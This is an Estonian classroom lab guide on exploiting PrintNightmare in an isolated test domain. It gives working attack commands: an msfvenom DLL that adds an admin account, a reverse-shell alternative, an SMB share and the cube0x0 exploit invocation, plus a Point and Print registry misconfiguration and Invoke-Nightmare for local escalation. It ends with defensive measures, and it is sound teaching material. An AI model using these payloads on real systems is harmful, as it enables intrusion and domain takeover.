# Labor: PrintNightmare (CVE-2021-34527 / CVE-2021-1675)

> **Kursus:** Küberturvalisus (täiskasvanud IT-õppijad, post-E-ITS)
> **Teema:** Windows Print Spooleri haavatavus — autentimise/AD rünnakud
> **Keskkond:** Proxmox SDN VNet, isoleeritud (väljast ligipääsmatu)
> **Hoiatus:** Kõik tegevused ainult selles isoleeritud õppelaboris. PrintNightmare on reaalne RCE (*Remote Code Execution* — kaugkäivitus) ja selle kasutamine võõra süsteemi vastu on kuritegu.

---

## 0. Lühendid (esmamainingul)

- **CVE** — *Common Vulnerabilities and Exposures*, haavatavuse avalik identifikaator
- **RCE** — *Remote Code Execution*, koodi kaugkäivitus
- **LPE** — *Local Privilege Escalation*, lokaalne õiguste tõstmine
- **AD** — *Active Directory*, Microsofti kataloogiteenus
- **DC** — *Domain Controller*, domeenikontroller
- **DNS** — *Domain Name System*, nimeteenus
- **DHCP** — *Dynamic Host Configuration Protocol*, IP-aadresside jagamine
- **GPO** — *Group Policy Object*, grupipoliitika objekt
- **RPC** — *Remote Procedure Call*, kaugprotseduuri väljakutse (Spooler kasutab liideseid MS-RPRN ja MS-PAR)
- **DLL** — *Dynamic-Link Library*, Windowsi teegifail (`.dll`)
- **SMB** — *Server Message Block*, Windowsi failijagamise protokoll (port 445)
- **UNC** — *Universal Naming Convention*, võrgutee kujul `\\server\jagatud\fail`
- **PoC** — *Proof of Concept*, tõestuskood
- **SYSTEM** — Windowsi kõrgeima õigusega lokaalne konto (`NT AUTHORITY\SYSTEM`)
- **NTLM** — *NT LAN Manager*, Windowsi autentimisprotokoll

---

## 1. TEOORIA — mis on PrintNightmare

Windowsi **Print Spooler** teenus (`spoolsv.exe`) töötab õigustega **SYSTEM** ja on vaikimisi käivitatud peaaegu kõigil Windowsi masinatel, **ka domeenikontrolleritel**. See pakub RPC-liidese, mille kaudu saab printeridraivereid lisada. Funktsioon **`RpcAddPrinterDriverEx` / `AddPrinterDriverEx`** paneb Spooleri laadima draiverina osutatud DLL-faili — ja kuna Spooler on SYSTEM, käivitub see DLL SYSTEM õigustes.

Viga on tähistatud kahe numbriga, mida algul segati:
- **CVE-2021-1675** — esialgu LPE, hiljem selgus, et võimaldab ka RCE-d.
- **CVE-2021-34527** — "PrintNightmare" õige nimi, RCE.

Rünnet saab läbi viia kahel moel ja **mõlemad on selles laboris olemas**:

| | **Meetod A — kaugründ Kalilt** | **Meetod B — lokaalne (itm4n juhend)** |
|---|---|---|
| Tööriist | cube0x0 PoC + Impacket | Caleb Stewart & John Hammond `CVE-2021-34527.ps1` / itm4n `PointAndPrint.ps1` |
| Kust jooksutatakse | Kali Linux | Windowsi ohvrimasina seest (madala õigusega kasutaja) |
| Eeldus | kehtiv madala õigusega **domeenikasutaja**, server **paikamata** | lokaalne kasutajasessioon + **vale Point and Print seadistus** |
| Tulemus | SYSTEM shell serveris | kohalik SYSTEM / admin |
| Pedagoogiline mõte | "paikamata server = kaugründ" | "paigatud aga valesti seadistatud = ikka omandatav" |

**NB! itm4n juhend ise katab meetodit B** (Point and Print väärseadistus, sh täielikult paigatud masinal). Kali-põhine meetod A on eraldi, cube0x0 tööriistaga.

---

## 2. LABORI ÜLESEHITUS (Proxmox SDN)

Näites kasutan VNetti **110** → võrk **192.168.110.0/24**. Asenda oma VNeti numbriga (`XXX`).

| Masin | OS | Roll | IP (näide) |
|---|---|---|---|
| **DC01** | Windows Server 2019 | AD DS + DNS (+ DHCP), **Print Spooler töötab**, **paikamata** | 192.168.110.10 |
| **KALI** | Kali Linux | Ründaja | 192.168.110.50 |
| **WS01** *(valikuline, soovituslik)* | Windows 10/11 | Domeeniga liitunud klient, madala õigusega kasutaja | 192.168.110.20 |

**Kas WS01 on vajalik?**
- **Meetod A jaoks ei ole** — piisab ühest domeenikasutajast, kelle paroolil Kalilt autenditakse.
- **Meetod B jaoks jah** — klient on loomulik "ohvri" masin, kus demonstreerida lokaalset eskalatsiooni ilma DC-sse interaktiivselt sisse logimata. (Su standardlaboris on niikuinii juba Windowsi klient; kasuta seda. Win10/11 on puhtam demo kui Win7.)

Võrguisolatsioon: VNet pakub laboris väljuva internetiühenduse (tööriistade allalaadimiseks), aga väljast pole masinad kättesaadavad — jälgi, et see nii jääks.

---

### 2.1 DC01 — Windows Server 2019 paigaldus ja "haavatavaks" jätmine

**Paigaldusmeedia (tõmmis):** kasuta **originaalset Windows Server 2019 tõmmisfaili** (RTM / varajane versioon). Meetodi A jaoks peab server olema **ilma 2021. a juuli (KB5004945) ja hilisemate Spooleri paikadeta**.

1. Loo VM, paigalda Server 2019 (GUI versioon sobib demoks hästi).
2. **Ära jooksuta Windows Update'it.** Lülita värskendused välja, et server jääks paikamata:
   ```powershell
   # PowerShell administraatorina DC01-l
   Stop-Service wuauserv                      # peata Windows Update teenus
   Set-Service wuauserv -StartupType Disabled # keela selle automaatkäivitus
   ```
   *Selgitus:* `wuauserv` on Windows Update'i teenus. Peatades ja keelates hoiame ära paikade saabumise, et CVE jääks aktiivseks.
3. Anna staatiline IP ja sea endale DNS-iks iseenda aadress (DC on ühtlasi DNS-server):
   ```powershell
   New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.110.10 -PrefixLength 24 -DefaultGateway 192.168.110.1
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.110.10
   ```
4. Paigalda AD DS ja ülenda domeenikontrolleriks (domeen nt `lab.local`):
   ```powershell
   Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
   Install-ADDSForest -DomainName "lab.local" -InstallDNS
   ```
   *Selgitus:* `Install-WindowsFeature` lisab rolli; `Install-ADDSForest` loob uue metsa/domeeni ja teeb masinast DC-i. Server teeb taaskäivituse.
5. **Kontrolli, et Print Spooler töötab** (vaikimisi töötab):
   ```powershell
   Get-Service Spooler       # Status peab olema Running
   ```
6. Loo madala õigusega domeenikasutaja ründe jaoks:
   ```powershell
   New-ADUser -Name "jaan" -SamAccountName "jaan" `
     -AccountPassword (ConvertTo-SecureString "Parool1!" -AsPlainText -Force) `
     -Enabled $true
   ```
   *Selgitus:* see on tavaline kasutaja ilma admini õigusteta — just nii modelleerime "ründajal on ühe töötaja paroolid" olukorda.

---

### 2.2 KALI — ründaja ettevalmistus

1. Anna Kalile IP samasse võrku (nt 192.168.110.50), kontrolli ühendust: `ping 192.168.110.10`.
2. Paigalda Impacket ja cube0x0 PoC **eraldatud Pythoni keskkonda (venv)**.

> **Tähtis tõrge, mida õpilased kohe kohtavad:** cube0x0 PoC vajab **tema enda Impacketi haru**, mis läheb vastuollu Kali vaikimisi Impacketiga. Tänapäevasel Kalil (Debian 12+, PEP 668) peatab süsteemne `pip install` end veaga `externally-managed-environment` ega lähe edasi. Lahendus on isoleeritud venv — nii ei pea süsteemset Impacketit üldse eemaldama (venv varjutab selle) ja paketihalduriga konflikti ei teki.

```bash
# eeldused
sudo apt update && sudo apt install -y git python3-venv

# eraldatud Pythoni keskkond ründe-tööriistadele
python3 -m venv ~/pn-lab
source ~/pn-lab/bin/activate        # NB! peab olema aktiivne IGAS Meetod A terminalis
pip install --upgrade pip

# cube0x0 impacket (fork) + PoC venv'i
git clone https://github.com/cube0x0/impacket ~/pn-lab/impacket
pip install ~/pn-lab/impacket
git clone https://github.com/cube0x0/CVE-2021-1675 ~/pn-lab/CVE-2021-1675
```
*Selgitus rea kaupa:* `python3 -m venv` loob isoleeritud keskkonna; `source .../activate` lülitab selle sisse (ainult aktiivses venv'is resolvuvad `rpcdump.py`, `smbserver.py` ja PoC õige Impacketi forki peale). `pip install ~/pn-lab/impacket` paigaldab cube0x0 versiooni (muudetud `MS-RPRN`/`MS-PAR` tugi) venv'i. Viimane käsk toob PoC-skripti `CVE-2021-1675.py`.

> **Reprodutseeritavus:** cube0x0 fork on 2021. aastast. Et labor töötaks ka aastate pärast, võib forki versiooni kinni naelutada: vali cube0x0 Impacketi repo ajaloost üks kindel commit ja käivita enne `pip install`-i `git -C ~/pn-lab/impacket checkout <hash>`, asendades `<hash>` päris väärtusega. Vaikimisi (ilma selleta) võtab labor forki viimase seisu.

> **Igas uues terminalis** (nt eraldi aknad SMB-serverile ja ründele) käivita enne tööd uuesti `source ~/pn-lab/bin/activate`.

---

## 3. DEMONSTRATSIOON — Meetod A: kaugründ Kalilt (cube0x0)

### Samm 1 — tuvasta haavatav Spooler
```bash
rpcdump.py @192.168.110.10 | egrep 'MS-RPRN|MS-PAR'
```
*Selgitus:* `rpcdump.py` (Impacketist) loetleb masina RPC-liidesed. Kui näed ridu **MS-RPRN** (Print System Remote Protocol) või **MS-PAR** (Print System Asynchronous Remote Protocol), on Spooleri RPC-liides ligipääsetav ja sihtmärk potentsiaalselt haavatav.

### Samm 2 — valmista pahavara DLL
Klassiruumi-sõbralik variant (ei vaja tagasiühendust): DLL, mis lisab lokaalse admini.
```bash
mkdir -p /tmp/share        # loo jagatav kaust ENNE — muidu msfvenom annab "No such file or directory"
msfvenom -p windows/x64/exec CMD='net user haxor Passw0rd123! /add && net localgroup administrators haxor /add' -f dll -o /tmp/share/evil.dll
```
*Selgitus:* `msfvenom` genereerib payloadi. `windows/x64/exec` käivitab antud käsu; siin loome uue kasutaja `haxor` ja lisame ta kohalike administraatorite gruppi. `-f dll` väljastab DLL-ina, `-o` salvestab faili. **Arhitektuur peab klappima (x64).**

*(Alternatiiv tagasikäivitatava shelliga: `-p windows/x64/meterpreter/reverse_tcp LHOST=192.168.110.50 LPORT=4444` ja käivita `msfconsole` → `use exploit/multi/handler`.)*

### Samm 3 — jaga DLL SMB kaudu
```bash
# uues terminalis kõigepealt: source ~/pn-lab/bin/activate
smbserver.py share /tmp/share -smb2support -user lab -password lab
```
*Selgitus:* püstitab SMB-serveri, mis jagab kausta `/tmp/share` nime all `share`. `-smb2support` lubab SMB2. **`-user/-password`** on olulised, sest uuem Windows keeldub anonüümsest SMB-st — autenditud jagamine toimib usaldusväärsemalt.

### Samm 4 — käivita rünne
```bash
# venv aktiivne (source ~/pn-lab/bin/activate)
python3 ~/pn-lab/CVE-2021-1675/CVE-2021-1675.py lab.local/jaan:'Parool1!'@192.168.110.10 '\\192.168.110.50\share\evil.dll'
```
*Selgitus rea kaupa:* `lab.local/jaan:'Parool1!'` on madala õigusega domeenikasutaja mandaat. `@192.168.110.10` on sihtserver DC01. Viimane argument on **UNC-tee** DLL-ini Kali SMB-jagamises. PoC sunnib DC01 Spoolerit seda DLL-i draiverina laadima — SYSTEM õigustes.

### Samm 5 — kontrolli tulemust
Kui kasutasid admini-lisamise payloadi:
```bash
# NetExec (nxc) — crackmapexec'i järglane; crackmapexec on arhiveeritud ja puudub uuemas Kalis
nxc smb 192.168.110.10 -u haxor -p 'Passw0rd123!'
# (vanemas Kalis võib samaväärselt veel toimida 'crackmapexec smb ...')
```
Kui kasutasid meterpreterit: handleris tekib sessioon, `getuid` näitab **NT AUTHORITY\SYSTEM**.

> **Tüüpvead klassis:** vale DLL-arhitektuur; SMB anonüümne keeld (lahendus: `-user/-password`); AV/Defender tapab payloadi (laboris lülita Defender välja); vale cube0x0 Impacketi versioon.

---

## 4. DEMONSTRATSIOON — Meetod B: lokaalne eskalatsioon (itm4n, Point and Print)

See on **itm4n juhendi põhistsenaarium**. Toimib **isegi paigatud masinal**, kui Point and Print on valesti seadistatud — just see teebki selle õppetunniks väärtuslikuks.

### Samm 1 — sea ohvrimasin (WS01 või DC01) "valesti seadistatuks"
Administraatorina (modelleerime nõrka GPO-d / registriseadet):
```powershell
$k = "HKLM:\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
New-Item -Path $k -Force | Out-Null
New-ItemProperty -Path $k -Name "NoWarningNoElevationOnInstall" -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $k -Name "RestrictDriverInstallationToAdministrators" -Value 0 -PropertyType DWORD -Force
New-ItemProperty -Path $k -Name "UpdatePromptSettings" -Value 2 -PropertyType DWORD -Force
```
*Selgitus:* `NoWarningNoElevationOnInstall=1` summutab õiguste-tõstmise hoiatuse draiveri paigaldamisel; `RestrictDriverInstallationToAdministrators=0` lubab tava­kasutajal draivereid paigaldada; `UpdatePromptSettings=2` summutab uuendusteate. See kombinatsioon avab lokaalse ründe ka paigatud süsteemil.

### Samm 2 — logi sisse madala õigusega kasutajana
WS01-l logi sisse kui `lab\jaan` (mitte admin). Vajadusel `Get-Service Spooler` → Running.

### Samm 3 — jooksuta PoC madala õigusega kasutajana
Lae alla Caleb Stewarti ja John Hammondi skript `CVE-2021-34527.ps1` (või itm4n `PointAndPrint.ps1`) ja osuta **absoluutsele lokaalsele DLL-teele** (itm4n rõhutab: absoluutne, lokaalne tee):
```powershell
# madala õigusega kasutaja PowerShellis
Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare -DriverName "Print Me" -NewUser "lpe" -NewPassword "Passw0rd123!"
```
*Selgitus:* `Invoke-Nightmare` ehitab pahavara DLL-i, mis loob uue kohaliku admini (`lpe`), ja registreerib selle "draiverina". Spooler laadib DLL-i SYSTEM õigustes → tavakasutaja sai lokaalse admini.

### Samm 4 — kontrolli
```powershell
net user lpe            # konto olemas?
net localgroup administrators   # kas 'lpe' on administraatorite seas?
```

> **Õppepunkt:** näita, et server/klient võib olla **täielikult paigatud**, aga vale Point and Print poliitika teeb ta ikka haavatavaks. itm4n lisab (2024-10-05 uuendus), et ka "turvaline" Package Point and Print + lubatud serverite nimekiri jääb avatuks man-in-the-middle ründele.

---

## 5. ANALÜÜS (õpilaste arutelu)

- Miks on Spooler eriti ohtlik **domeenikontrolleril**? (SYSTEM DC-l ≈ kogu domeeni kompromiss.)
- Mis vahe on meetodil A ja B ründaja eelduste osas (võrguautentimine vs lokaalne sessioon)?
- Kuidas paik 2021. a juulis asja ei lahendanud ja miks vajati augusti paika + `RestrictDriverInstallationToAdministrators` vaikeväärtuse muutust?
- Millise jälje jätab rünne logidesse (vt kaitse)?

---

## 6. KAITSEMEETMED

1. **Paika** (2021. a august ja hilisemad) ja hoia süsteemid paigatuna.
2. **Kui printimist pole vaja — peata ja keela Spooler**, eriti DC-del:
   ```powershell
   Stop-Service Spooler
   Set-Service Spooler -StartupType Disabled
   ```
3. **`RestrictDriverInstallationToAdministrators = 1`** (lubab draiverite paigalduse ainult administraatoritele — augusti 2021 paiga vaikeväärtus).
4. **Point and Print turvaliselt:** "Only use Package Point and print" sees, lubatud serverite nimekiri (teadmisega, et MITM-risk jääb).
5. **Võrgusegmenteerimine:** piira tööjaamadest DC-dele sissetulev 135/445 + RPC.
6. **Seire:** Sysmon + Windows sündmused (Spooleri driver-load; `Microsoft-Windows-PrintService/Operational`); AddPrinterDriverEx jälgimine. Seo oma olemasoleva seirega (Zabbix) ja E-ITS meetmetega.

---

## 7. Kontroll-loend labori jaoks

- [ ] DC01: Server 2019 paigaldatud originaaltõmmisest, **paikamata**, Windows Update keelatud
- [ ] DC01: AD DS + DNS püsti, domeen `lab.local`, Spooler Running
- [ ] DC01: madala õigusega kasutaja `jaan` loodud
- [ ] KALI: venv `~/pn-lab` loodud, cube0x0 Impacket + `CVE-2021-1675` venv'i paigaldatud/kloonitud, võrguühendus DC-ni olemas
- [ ] WS01 *(kui meetod B)*: domeeniga liitunud, Point and Print väärseadistus peal, madala õigusega sisselogimine
- [ ] Defender/AV laboris välja lülitatud (demo puhtuseks)
- [ ] VNet isoleeritud — väljast ligipääsmatu

---

### Viited
- itm4n, "PrintNightmare exploitation" — https://itm4n.github.io/printnightmare-exploitation/ (meetod B / Point and Print, sh paigatud-aga-väärseadistatud)
- cube0x0, CVE-2021-1675 PoC — https://github.com/cube0x0/CVE-2021-1675 (meetod A)
- Caleb Stewart & John Hammond, CVE-2021-34527.ps1
- Microsoft juhis KB5005010 / Point and Print seaded
